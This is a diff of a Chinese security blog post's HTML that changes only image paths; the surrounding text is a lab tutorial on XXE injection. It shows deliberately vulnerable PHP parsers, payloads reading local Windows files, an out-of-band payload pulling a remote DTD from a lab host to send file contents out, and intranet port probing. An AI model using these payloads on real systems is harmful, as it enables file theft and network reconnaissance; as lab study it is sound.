@@ -13,23 +13,23 @@
 <meta property="og:site_name" content="R17a&#39;s blog">
 <meta property="og:description" content="之前巩固了XML相关的基础知识，现在温故下XXE（XML External Entity Injection，XML外部实体注入）漏洞。 跟着一篇文章带你深入理解漏洞之 XXE 漏洞来做实验。 本地实验环境：windows7；phpstudy； 实验1：有回显读本地敏感文件：1.php：在服务能接收并解析 XML 格式的输入并回显 12345678910111213&lt;?php    libx">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010143120990.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010143254706.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010150247697.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010150214693.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010150030222.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010155617522.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010155731526.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201015150509068.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201015150709400.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201015150849429.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/02/imgs/image-20201015151030931.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201010143120990.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201010143254706.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201010150247697.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201010150214693.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201010150030222.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201010155617522.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201010155731526.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201015150509068.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201015150709400.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201015150849429.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201015151030931.png">
 <meta property="article:published_time" content="2020-09-02T13:38:15.000Z">
 <meta property="article:modified_time" content="2020-10-13T13:38:15.000Z">
 <meta property="article:author" content="R17a">
 <meta property="article:tag" content="XXE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/09/02/imgs/image-20201010143120990.png">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20201010143120990.png">
     
     
         
@@ -180,15 +180,15 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    <span class="comment">// php://input 是个可以访问请求的原始数据的只读流。</span></span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	<span class="comment">// 从字符串加载为XML</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">	<span class="comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>文件放在www目录的xxe文件后访问如下：</p>
-<p><img src="../imgs/image-20201010143120990.png" alt="image-20201010143120990"></p>
+<p><img src="/imgs/image-20201010143120990.png" alt="image-20201010143120990"></p>
 <p>用burp suite抓放，可以看到成功获取到文件内容</p>
 <figure class="highlight xml"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/system.ini"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="../imgs/image-20201010143254706.png" alt="image-20201010143254706"></p>
+<p><img src="/imgs/image-20201010143254706.png" alt="image-20201010143254706"></p>
 <p><strong>进阶</strong>：为了防止文件里面有特殊符号（&lt;&gt;/等）导致不能读取，使用CDATA来读取（CDATA 区段中的文本会被解析器忽略）</p>
-<p><img src="../imgs/image-20201010150247697.png" alt="image-20201010150247697"></p>
+<p><img src="/imgs/image-20201010150247697.png" alt="image-20201010150247697"></p>
 <p>首先看下不做处理的效果</p>
-<p><img src="../imgs/image-20201010150214693.png" alt="image-20201010150214693"></p>
+<p><img src="/imgs/image-20201010150214693.png" alt="image-20201010150214693"></p>
 <p>然后使用CDATA处理的payload</p>
 <figure class="highlight xml"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/phpStudy/test.txt"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.116.140/xxe/evil.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -196,7 +196,7 @@
 <figure class="highlight plain"><figcaption><span>evil.dtd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>此时可以正常读取文件</p>
-<p><img src="../imgs/image-20201010150030222.png" alt="image-20201010150030222"></p>
+<p><img src="/imgs/image-20201010150030222.png" alt="image-20201010150030222"></p>
 <h3 id="实验2：无回显读取本地敏感文件"><a href="#实验2：无回显读取本地敏感文件" class="headerlink" title="实验2：无回显读取本地敏感文件"></a>实验2：无回显读取本地敏感文件</h3><p>2.php</p>
 <figure class="highlight php"><figcaption><span>2.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">	$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -207,17 +207,17 @@
 <p>抓放包</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.116.140&#x2F;xxe&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="../imgs/image-20201010155617522.png" alt="image-20201010155617522"></p>
+<p><img src="/imgs/image-20201010155617522.png" alt="image-20201010155617522"></p>
 <p>远程端口接收到连接，这个时候我们就获取到了base64编码过的文件内容</p>
-<p><img src="../imgs/image-20201010155731526.png" alt="image-20201010155731526"></p>
+<p><img src="/imgs/image-20201010155731526.png" alt="image-20201010155731526"></p>
 <p>其实这个实验整个的思路就是我们通过payload的remote读取远程服务器上的test.dtd内容，引用test.dtd的int，再去调用send发送请求，通过操作获取本地服务器的文件并发送内容到我们的监听端口，这时候我们可以从监听端口获取信息，监听端口也可以是dnslog等。</p>
 <h3 id="实验3和4：HTTP-内网主机-端口探测"><a href="#实验3和4：HTTP-内网主机-端口探测" class="headerlink" title="实验3和4：HTTP 内网主机/端口探测"></a>实验3和4：HTTP 内网主机/端口探测</h3><p>利用XXE漏洞探测内网，以存在XXE漏洞的服务器作为内网支点探测内网存活HTTP服务</p>
 <p>还是用上面的2.php。如下图，探测<a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a> 当服务能访问通会返回Content error in the external subset in <a href="http://127.0.0.1/，如果是不存在的服务，将返回DOMDocument::loadXML()" target="_blank" rel="noopener">http://127.0.0.1/，如果是不存在的服务，将返回DOMDocument::loadXML()</a>: failed to load external entity &quot;<a href="http://127.0.0.1:66/" target="_blank" rel="noopener">http://127.0.0.1:66/</a>&quot;</p>
-<p><img src="../imgs/image-20201015150509068.png" alt="image-20201015150509068"></p>
-<p><img src="../imgs/image-20201015150709400.png" alt="image-20201015150709400"></p>
+<p><img src="/imgs/image-20201015150509068.png" alt="image-20201015150509068"></p>
+<p><img src="/imgs/image-20201015150709400.png" alt="image-20201015150709400"></p>
 <p>我们可以根据返回结果来判定服务是否存在，利用intruder模块，</p>
-<p><img src="../imgs/image-20201015150849429.png" alt="image-20201015150849429"></p>
-<p><img src="../imgs/image-20201015151030931.png" alt="image-20201015151030931"></p>
+<p><img src="/imgs/image-20201015150849429.png" alt="image-20201015150849429"></p>
+<p><img src="/imgs/image-20201015151030931.png" alt="image-20201015151030931"></p>
 <p>参考链接：</p>
 <p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
 <p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p>
